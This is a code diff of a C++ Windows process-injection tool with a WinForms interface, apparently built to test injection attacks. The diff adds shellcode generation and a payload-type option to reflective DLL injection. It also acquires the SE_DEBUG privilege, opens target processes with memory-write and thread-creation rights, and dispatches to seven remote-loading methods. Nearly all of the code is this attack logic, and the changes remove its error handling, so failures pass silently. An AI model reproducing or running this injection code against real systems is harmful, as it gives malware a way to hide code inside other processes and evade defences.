@@ -1,14 +1,17 @@
-#include "Form1.h"
-#include <Windows.h>
+#include "LoadLibraryR.h"
 #include <stdio.h>
 #include <stdlib.h>
-#include "LoadLibraryR.h"
 
-using namespace CppCLRWinformsProjekt;
+//###########################
 
-static DWORD dwLength = 0;
-static LPVOID lpBuffer = NULL;
-static const char* exportedFuncName = "ReflectiveLoader";
+
+DWORD dwLength = 0;
+LPVOID lpBuffer = NULL;
+LPVOID lpParameter = NULL;
+DWORD dwReflectiveLoaderOffset = 0;
+LPVOID shellcode = NULL;
+
+//////////////////////////////////////////////////////////////////////////////
 
 void init() {
 	FILE* fp = NULL;
@@ -16,27 +19,31 @@ void init() {
 	HANDLE hToken = NULL;
 
 	const char* cpDllFile = "InjecteeDLL.dll";
+	const char* exportedFuncName = "ReflectiveLoader";
 
 
+	//Initialize DLL payload.
 	fopen_s(&fp, cpDllFile, "rb");
 	if (fp == NULL) {
-		//printf("Error: file not found.\n");
-		//exit(1);
-	}
 
+	}
+	
 	fseek(fp, 0L, SEEK_END);
 	dwLength = ftell(fp);
 	fseek(fp, 0L, SEEK_SET);
 
 	lpBuffer = malloc(dwLength);
 	if (lpBuffer == NULL) {
-		//printf("Error: cannot allocate heap.\n");
-		//exit(1);
+
 	}
 
 	fread(lpBuffer, 1, dwLength, fp);
 	fclose(fp);
 
+	//Generating Shellcode.
+	shellcode = (LPVOID)_gen_payload_2();
+
+	//Get the SE_DEBUG_PRIVILEGE.
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 	{
 		priv.PrivilegeCount = 1;
@@ -50,8 +57,18 @@ void init() {
 		CloseHandle(hToken);
 	}
 
+
+
+	// check if the library has a ReflectiveLoader
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, exportedFuncName);
+	if (!dwReflectiveLoaderOffset)
+	{
+		exit(1);
+	}
 }
 
+//////////////////////////////////////////////////////////////////////////////
+//Free DLL payload.
 void exiting() {
 
 	if (lpBuffer)
@@ -59,35 +76,39 @@ void exiting() {
 
 }
 
-void attack(unsigned int pid, unsigned int tid, int method)
+
+
+void attack(unsigned int pid, unsigned int tid, int method, int payload_type)
 {
 	HANDLE hFile = NULL;
 	HANDLE hModule = NULL;
 	HANDLE hProcess = NULL;
 
 
-
-
-
-
-
-	//if (argc != 5) {
-	//	printf("usage: %s <injection_method> <dll> <exported_function_name> <pid>\n", argv[0]);
-	//	printf("<exported_function_name>: Exported function name in DLL (function using __declspec(dllexport))\n");
-	//	printf("\ninjection_method list (kind of LoadRemoteLibraryR):\n");
-	//	printf("1. it uses CreateRemoteThread, VirtualAllocEx and WriteProcessMemory.\n");
-	//	printf("2. it uses CreateRemoteThread, CreateFileMappingA, MapViewOfFile and PNtMapViewOfSection.\n");
-	//	exit(0);
-	//}
+	//////////////////////////////////////////////////////////////////////////////
+	// Checking inputs.
 
 	Form1^ form = (Form1^)Application::OpenForms[0];
-	if (method != 5 && pid == 0) {
-		form->set_status("Requiring Target PID.");
-		return;
-	}
-	else if (method == 0) {
+
+	if (method == 0) {
 		form->set_status("Choose the Attack Option.");
 		return;
+	}
+	else if (method != 5 && pid == 0) {
+
+		STARTUPINFO suinfo = { 0 };
+		suinfo.cb = sizeof(STARTUPINFO);
+		PROCESS_INFORMATION procinfo;
+
+		CreateProcess(NULL, "TestProcess.exe", NULL, NULL, FALSE, 0, NULL, NULL, &suinfo, &procinfo);
+
+		pid = procinfo.dwProcessId;
+		tid = procinfo.dwThreadId;
+
+		form->set_status("Executing TestProcess.exe.");
+
+		
+		Sleep(200);
 	}
 	else {
 		form->set_status("");
@@ -96,45 +117,46 @@ void attack(unsigned int pid, unsigned int tid, int method)
 	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION 
 		| PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
 	if (hProcess == NULL) {
-		//printf("Error: cannot open the target process.\n");
-		//exit(1);
+		
 	}
 
+
+	//////////////////////////////////////////////////////////////////////////////
 	// using various method for alternative LoadLibrary API
 	switch (method) {
 	case 1:
-		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
+		hModule = LoadRemoteLibraryR(payload_type, hProcess);
 		break;
 	case 2:
-		hModule = LoadRemoteLibraryR2(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
+		hModule = LoadRemoteLibraryR2(payload_type, hProcess);
 		break;
 	case 3:
 		if (tid == 0) {
 			form->set_status("#3 requires Target TID.");
 			break;
 		}
-		LoadRemoteLibraryR3(hProcess, tid , lpBuffer, dwLength, NULL, exportedFuncName);
+		LoadRemoteLibraryR3(payload_type, hProcess, tid);
 		break;
 	case 4:
 		if (tid == 0) {
 			form->set_status("#4 requires Target TID.");
 			break;
 		}
-		LoadRemoteLibraryR4(hProcess, tid, lpBuffer, dwLength, NULL, exportedFuncName);
+		LoadRemoteLibraryR4(payload_type, hProcess, tid);
 		break;
 	case 5:
-		LoadRemoteLibraryR5(lpBuffer, dwLength, NULL, exportedFuncName);
+		LoadRemoteLibraryR5(payload_type);
+		break;
+	case 6:
+		LoadRemoteLibraryR6(payload_type, hProcess);
+		break;
+	case 7:
+		LoadRemoteLibraryR5(payload_type);
 		break;
 	default:
 		break;
 	}
 
-	//if (hModule == NULL) {
-	//	printf("Error: cannot inject %s DLL file.\n", cpDllFile);
-	//	//exit(1);
-	//}
-
-	//printf("Injected the %s DLL into process %d.\n", cpDllFile, pid);
 	WaitForSingleObject(hModule, -1);
 
 	if (hProcess)
